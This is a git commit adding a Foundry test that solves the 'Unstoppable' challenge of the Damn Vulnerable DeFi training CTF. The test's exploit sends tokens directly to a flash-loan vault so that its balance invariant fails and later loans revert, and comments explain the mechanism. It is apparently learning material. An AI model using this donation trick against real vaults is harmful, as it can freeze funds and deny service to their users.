ed78d373405574f511e1977adb7f8cc3326dd2ea
blankf1sh <123241176+blankf1sh@users.noreply.github.com>
2023-01-24 00:15:27 +0000

    unstoppable completed - fun way of learning foundry

--- test/Unstoppable.t.sol
+++ test/Unstoppable.t.sol
@@ -1,20 +1,73 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
-import "lib/damn-vulnerable-defi/contracts/DamnValuableToken.sol";
-import "lib/damn-vulnerable-defi/contracts/unstoppable/UnstoppableVault.sol";
+import {Utilities} from  "./utils/Utilities.sol";
+import "dvd-v3/DamnValuableToken.sol";
+import "dvd-v3/unstoppable/UnstoppableVault.sol";
+import "dvd-v3/unstoppable/ReceiverUnstoppable.sol";
 
 contract Unstoppable is Test {
+	uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
+	uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
+
+	address payable internal deployer;
+	address payable internal attacker;
+	address payable internal someUser;
+
+	Utilities internal utils;
+
+	DamnValuableToken internal dvt;
+	UnstoppableVault internal usv;
+	ReceiverUnstoppable internal rus;
 
 	function setUp() public {
+		utils = new Utilities();
+		address payable[] memory users = utils.createUsers(3);
+		deployer = users[0];
+		attacker = users[1];
+		someUser = users[2];
+		
+		vm.startPrank(deployer);
 
+		dvt = new DamnValuableToken();
+		usv = new UnstoppableVault(dvt, address(deployer), address(deployer));
+		
+		// check that usv.asset() is equal to address(dvt)
+
+		dvt.approve(address(usv), TOKENS_IN_VAULT);
+		usv.deposit(TOKENS_IN_VAULT, address(deployer));
+
+		dvt.transfer(address(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
+		vm.stopPrank();
+		
+		vm.startPrank(someUser);
+		rus = new ReceiverUnstoppable(address(usv));
+		rus.executeFlashLoan(10);
+		vm.stopPrank();
+		
+		vm.label(deployer,"Deployer");
+		vm.label(attacker,"Attacker");
+		vm.label(someUser,"SomeUser");
+		vm.label(address(dvt),"Token");
+		vm.label(address(usv),"Vault");
+		vm.label(address(rus),"Receiver");
 	}
 
 	function testExploit() public {
-
+		vm.startPrank(attacker);
+		// crux of the problem is breaking invariant such that convertToShares(totalSupply) != balanceBefore
+		// => balanceBefore = totalAssets()
+		// => totalAssets() = assset.balanceOf(address(this))
+		// => convertToShares(totalSupply) = tS == 0 ? tS : tS.MulDivDown(totalAssets(), tS)
+		dvt.transfer(address(usv), INITIAL_ATTACKER_TOKEN_BALANCE);
+		vm.stopPrank();
+		vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
+		validation();
 	}
 
-	function testExploitSuccessful() public {
-
+	function validation() public {
+		vm.startPrank(someUser);
+		rus.executeFlashLoan(10);
+		vm.stopPrank();
 	}
 }
